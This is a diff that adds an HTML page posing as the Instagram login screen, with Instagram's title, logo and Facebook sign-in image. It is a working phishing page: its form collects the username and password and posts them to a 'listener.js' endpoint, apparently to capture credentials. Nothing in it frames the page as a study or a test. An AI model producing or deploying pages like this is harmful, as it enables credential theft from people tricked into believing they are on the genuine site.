@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<html>
+
+<head>
+	<meta charset="utf-8">
+	<link rel="shortcut icon" href="images/logo.jpg" type="image/x-icon" > 
+	<title>Login • Instagram</title> 
+	
+</head>
+
+<body style="background-color:#f2f2f2;">
+<style>
+	#username,#password{
+		position:relative;
+		left:10%;
+		width:80%;
+		height:9%;
+		background-color:#f2f2f2;
+		border-radius: 5px;
+	}
+
+	#Or{
+		color:#8c8c8c;
+	}
+
+	#submit{
+		position:relative;
+		left:10%;
+		width:80%;
+		height:7%;
+		background-color:#1a8cff;
+		color:white;
+		border-radius: 5px;
+	}
+ 
+	form{
+		height:600px;
+		width:50%;
+		background-color:white;
+		padding-left:1% 1% ;
+		position:absolute;
+		left:25%;
+		border: 2px solid #bfbfbf;
+		overflow:hidden;
+	}
+	
+	.line{
+		width: 33%;
+		height: 0;
+		border: 1px solid #C4C4C4;
+		margin: 3px;
+		display:inline-block;
+		position:relative;
+		left:12%;
+	}
+
+	#Or{
+		position:relative;
+		left:12%
+	}
+	
+	#bottom{
+	position:relative;
+	top:10px;
+	left:150px;
+	}
+
+	#footer{
+		position:absolute;
+		top:650px;
+		overflow:hidden;
+	}
+
+</style>
+
+ <form action="/../../listener.js" method="POST">
+ </br>
+
+	<img alt="insta" src="images/insta.png" width="57%" height="13%" style="position:relative;left:20%;"></img></br></br>
+	<input type="text" id="username" name="username" placeholder="Phone number, username, or email" required ><br></br>
+	<input type="password" id="password" name="password" placeholder="Password" required><br><br>
+	<input type="submit" id="submit" name="sbmt" value="Log In"><br><br>
+	<div class="line"></div>
+	<div id="Or" style="display:inline-block;">OR</div>
+	<div class="line"></div><br><br>
+	<img id="bottom"  src="images/fb.png"></img>
+	
+</form> 
+	
+	<img id="footer" alt="insta" width="100%" src="images/footer.png"></img>
+
+</body>
+</html>
